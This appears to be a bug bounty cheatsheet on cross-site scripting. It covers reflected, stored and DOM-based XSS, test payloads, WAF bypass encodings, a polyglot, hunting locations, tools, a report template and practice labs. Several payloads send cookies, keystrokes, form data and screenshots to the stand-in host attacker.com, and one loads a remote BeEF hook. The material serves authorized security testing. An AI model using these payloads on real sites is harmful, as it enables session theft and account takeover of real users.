# Cross-Site Scripting (XSS) — Complete Bug Bounty Cheatsheet

> **OWASP:** A05:2025 — Injection  
> **Severity:** High/Critical — leads to account takeover, data theft, malware delivery  
> **Bounty Range:** $200 – $20,000+ depending on impact and context

---

## What is XSS?

XSS allows attackers to inject malicious scripts into web pages viewed by other users. The browser trusts the script because it came from the legitimate website — and executes it with full access to cookies, session tokens, and page content.

---

## 3 Types of XSS

### 1. Reflected XSS
Payload is in the URL — server reflects it back in the HTML response immediately.

```
How it works:
1. Attacker crafts malicious URL
2. Victim clicks the link
3. Server reflects payload in response
4. Browser executes the script

Example URL:
https://target.com/search?q=<script>alert(document.cookie)</script>

Test payloads:
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
<img src=x onerror=alert(1)>
"><img src=x onerror=alert(document.domain)>
```

---

### 2. Stored XSS
Payload is saved in the database and executes for EVERY user who visits the page. Most dangerous type.

```
Where to look:
- Comment sections
- User profiles (bio, username, address)
- Product reviews
- Chat messages
- Support tickets
- Any field that displays to other users

Payload to test in comment/profile:
<script>document.location='https://attacker.com/?c='+document.cookie</script>

Steal cookies from ALL visitors:
<script>
  new Image().src='https://attacker.com/steal?c='+encodeURIComponent(document.cookie);
</script>
```

---

### 3. DOM-Based XSS
Payload is processed entirely by client-side JavaScript — never sent to the server. Hard to detect in logs.

```javascript
// Vulnerable code example:
var search = location.hash.substring(1);
document.getElementById("output").innerHTML = search;

// Attack URL:
https://target.com/page#<img src=x onerror=alert(1)>

// Common DOM sinks (where data ends up):
innerHTML           ← most common
document.write()
eval()
setTimeout(str)
location.href
element.src

// Common DOM sources (where data comes from):
location.search     ← URL query params
location.hash       ← URL fragment
document.referrer
postMessage
localStorage/sessionStorage
```

---

## What Attackers Do With XSS

```javascript
// 1. Steal session cookie → account takeover
document.location='https://attacker.com/?c='+document.cookie

// 2. Keylogger → capture everything typed
document.onkeypress = function(e) {
  new Image().src = 'https://attacker.com/keys?k=' + e.key;
}

// 3. Redirect to phishing
window.location = 'https://target-fake.com/login';

// 4. Steal form data → hijack payment
document.querySelector('form').addEventListener('submit', function(e) {
  fetch('https://attacker.com/steal', {method:'POST', body: new FormData(this)});
});

// 5. BeEF hook → full browser control
<script src="https://attacker.com/hook.js"></script>

// 6. Screenshot
html2canvas(document.body).then(c => {
  fetch('https://attacker.com/screen', {method:'POST', body: c.toDataURL()});
});
```

---

## WAF Bypass Techniques

```html
<!-- Case variation -->
<Script>AlErT(1)</sCrIpt>

<!-- HTML encoding -->
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;

<!-- Double encoding -->
%253Cscript%253Ealert(1)%253C%2Fscript%253E

<!-- Event handlers (no script tag) -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onresize=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>

<!-- No parentheses -->
<img src=x onerror=alert`1`>
<script>alert`1`</script>

<!-- No quotes -->
<img src=x onerror=alert(1) x=

<!-- JavaScript protocol -->
<a href="javascript:alert(1)">click</a>

<!-- Template literals -->
<script>var x=`${alert(1)}`</script>

<!-- Polyglot payload -->
javascript:"/*'/*`/*--></noscript></title></textarea></style></template>
</noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert(1)//
```

---

## Where to Hunt XSS

| Location | Type | Notes |
|----------|------|-------|
| Search bars | Reflected | Most common, test every search |
| Comment/review fields | Stored | High impact — hits all users |
| User profile fields | Stored | Username, bio, social links |
| Error messages | Reflected | "Search for X not found" |
| URL fragments (#hash) | DOM | Check JS source for sinks |
| File upload names | Stored | Filename displayed somewhere? |
| Email fields | Stored | Rendered in admin panel? |
| Support chat | Stored | Attacker sees agent's session |
| JSON responses | Reflected | If rendered unsanitized |
| HTTP headers | Reflected | User-Agent, Referer displayed? |

---

## Bug Bounty Testing Checklist

```
BASIC TESTS
☐ <script>alert(1)</script>
☐ "><script>alert(1)</script>
☐ '><script>alert(1)</script>
☐ <img src=x onerror=alert(1)>
☐ <svg onload=alert(1)>

DOM XSS
☐ Check URL params in JS source (Ctrl+F: location.search, location.hash)
☐ Look for innerHTML, document.write usage
☐ Test #fragment: page.html#<img src=x onerror=alert(1)>

STORED XSS
☐ Post XSS payload in every input that displays to users
☐ Check if admin panels render user input unsanitized

CSP CHECK
☐ Response has Content-Security-Policy header?
☐ If no CSP → higher severity finding

IMPACT ESCALATION
☐ Can you steal admin cookies? → Critical
☐ Can you perform actions as other users? → High
☐ Is it only self-XSS? → Usually informational
```

---

## Tools

| Tool | Use |
|------|-----|
| Burp Suite | Intercept, test, scan for XSS |
| XSStrike | Advanced XSS detection & WAF bypass |
| Dalfox | Fast XSS scanner for parameter testing |
| BeEF | Browser Exploitation Framework |
| [XSS Hunter](https://xsshunter.trufflesecurity.com) | Blind XSS detection |

---

## Bug Bounty Report Template

```
Title: Stored XSS in User Profile Bio Field

Severity: High (CVSS 8.3)

Endpoint: POST /api/users/profile
Field: bio

Payload Used:
<script>document.location='https://attacker.com/?c='+document.cookie</script>

Steps to Reproduce:
1. Log in and navigate to Profile Settings
2. Enter payload in Bio field and save
3. Log in as a different user
4. Navigate to attacker's profile page
5. Observe: cookies sent to attacker.com

Impact:
Any user who views the attacker's profile has their session
cookie stolen, resulting in full account takeover.

Remediation:
- HTML encode all user-supplied output
- Implement Content Security Policy (CSP)
- Use framework-level output encoding (DOMPurify)
```

---

## Practice Labs

- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting) — 30 free labs
- [XSS Game by Google](https://xss-game.appspot.com)
- [DVWA XSS Module](https://github.com/digininja/DVWA)
- [PentesterLab XSS](https://pentesterlab.com)

---

## Key Takeaway

> XSS is **everywhere** — and most developers still don't sanitize output correctly.  
> Stored XSS hitting admin panels = Critical finding on every platform.  
> Always escalate impact: don't just alert(1) — show cookie theft or account takeover.

---

*Daily Bug Bounty notes, cheatsheets & payloads — follow along.*
